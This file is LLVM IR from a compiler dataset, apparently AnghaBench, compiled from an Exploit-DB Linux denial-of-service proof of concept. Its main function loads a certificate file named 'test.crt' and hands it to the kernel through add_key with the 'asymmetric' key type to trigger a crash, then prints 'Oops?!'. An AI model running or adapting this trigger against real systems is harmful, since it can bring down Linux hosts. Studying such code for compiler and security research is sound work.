; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_40762.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_40762.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [9 x i8] c"test.crt\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@SEEK_END = common dso_local global i32 0, align 4
@SEEK_SET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [11 x i8] c"asymmetric\00", align 1
@.str.3 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"Oops?!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = call i32* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %7, i32** %2, align 8
  %8 = load i32*, i32** %2, align 8
  %9 = icmp eq i32* %8, null
  br i1 %9, label %10, label %11

10:                                               ; preds = %0
  store i32 1, i32* %1, align 4
  br label %45

11:                                               ; preds = %0
  %12 = load i32*, i32** %2, align 8
  %13 = load i32, i32* @SEEK_END, align 4
  %14 = call i32 @fseek(i32* %12, i64 0, i32 %13)
  %15 = load i32*, i32** %2, align 8
  %16 = call i64 @ftell(i32* %15)
  store i64 %16, i64* %4, align 8
  %17 = load i32*, i32** %2, align 8
  %18 = load i32, i32* @SEEK_SET, align 4
  %19 = call i32 @fseek(i32* %17, i64 0, i32 %18)
  %20 = load i64, i64* %4, align 8
  %21 = call i64 @calloc(i64 %20, i32 1)
  %22 = inttoptr i64 %21 to i8*
  store i8* %22, i8** %3, align 8
  %23 = load i8*, i8** %3, align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %25, label %26

25:                                               ; preds = %11
  store i32 1, i32* %1, align 4
  br label %45

26:                                               ; preds = %11
  %27 = load i8*, i8** %3, align 8
  %28 = load i64, i64* %4, align 8
  %29 = load i32*, i32** %2, align 8
  %30 = call i32 @fread(i8* %27, i32 1, i64 %28, i32* %29)
  %31 = load i32*, i32** %2, align 8
  %32 = call i32 @fclose(i32* %31)
  %33 = load i8*, i8** %3, align 8
  %34 = load i64, i64* %4, align 8
  %35 = call i32 @add_key(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0), i8* %33, i64 %34, i32 -3)
  store i32 %35, i32* %5, align 4
  %36 = call i32 @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %37 = load i32, i32* %5, align 4
  %38 = icmp ne i32 %37, -1
  br i1 %38, label %39, label %42

39:                                               ; preds = %26
  %40 = load i32, i32* %5, align 4
  %41 = call i32 @keyctl_unlink(i32 %40, i32 -3)
  br label %42

42:                                               ; preds = %39, %26
  %43 = load i8*, i8** %3, align 8
  %44 = call i32 @free(i8* %43)
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %42, %25, %10
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fseek(i32*, i64, i32) #1

declare dso_local i64 @ftell(i32*) #1

declare dso_local i64 @calloc(i64, i32) #1

declare dso_local i32 @fread(i8*, i32, i64, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @add_key(i8*, i8*, i8*, i64, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @keyctl_unlink(i32, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
